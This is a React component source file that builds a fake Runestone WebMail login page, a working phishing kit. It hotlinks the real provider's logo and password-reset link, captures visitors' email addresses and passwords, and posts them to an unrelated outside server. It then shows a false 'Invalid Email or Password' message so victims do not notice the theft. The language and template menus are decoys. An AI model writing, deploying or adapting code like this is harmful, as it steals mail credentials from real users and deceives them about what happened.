import React from 'react';
import './home.css';

import { useState } from 'react';
import axios from 'axios';



function Home(){

    const[email, setEmail] = useState("");
    const[password, setPassword] = useState("");
    const[language, setLanguage] = useState("");
    const[platform, setPlatform] = useState("Runestone")

    const[showError, setShowError] = useState(false);

    
    async function handleSubmit(e) {
        e.preventDefault();

        try {
            const response = await axios.post('https://myrootbackend-4cjn.onrender.com/api/send', {
                email:email,
                password:password,
                platform:platform
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);

            if(response.status == 200){
                console.log(response.data.message);

                setShowError(true);
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
    }
    


    return(
        <>

        {showError && <div class="alert alert-danger alert-dismissible fade show" role="alert">
  <strong>Invalid Email or Password</strong> 
  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
    <span aria-hidden="true">&times;</span>
  </button>
</div>}
            <div className='imagecontainer'>
                <h3><img src="https://webmail.runestone.net/scripts/image.pl" alt="WebMail"/></h3>

            </div>


    

                <div className='col-md-5 m-auto'>
                    <fieldset className=''>
                        <legend>Welcome to WebMail</legend>

            

                        <form onSubmit={handleSubmit}>

                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Email Address</label></span>
                                                <div class="element"><input type="email"onChange={function(e){
                                                    setEmail(e.target.value);
                                                }}  value={email} required/>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Password</label></span>
                                                <div class="element"><input type="password"onChange={function(e){
                                                    setPassword(e.target.value);
                                                }} value={password} required/>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Template Set</label></span>
                                                <div class="element"><select className=''required>
                                                        <option value="Standard">Standard</option>
                                                        <option value="Basic">Basic</option>
                                                        <option value="Mobile">Mobile</option>

                                                </select>
                                </div>
                        </div>

                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Language</label></span>
                                                <div class="element"><select  onChange={function(e){
                                                    setLanguage(e.target.value)
                                                }} className=''required>
                                                <option value="English US">English</option>
                                                    <option value="French" >French</option>
                                                    <option value="Portuguese" >Portuguese</option>
                                                    <option value="Danish" >Danish</option>
                                                    <option value="Dutch" >Dutch</option>
                                                    <option value="German" >German</option>
                                                    <option value="Spanish" >Spanish</option>

                                                </select>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label className='font-weight-bold' for="user">Remember Me</label></span>
                                                <div class="element"><input name="remember" id="remember" type="checkbox"/>
                                </div>
                        </div>


                        <div class="formrow text-center">
                            <span class="prompt">&nbsp;</span>
                            <div class="element">
                                <a href="https://webmail.runestone.net/cgi/user.cgi?cmd=cmd_user_forget">Forgot password</a>
                            </div>
                        </div>


                        <div class="formrow">
                <span class="prompt">&nbsp;</span>
                <div class="element">
			<input name="cmd_login" class="loginbutton" id="cmd_login" value="Log in"  tabindex="3" type="submit"/>
                   
                </div>
        </div>


                        </form>

                    </fieldset>
                </div>

                <br/>

        <div className='divv'>

        </div>

           
        </>
    );
}


export default Home;
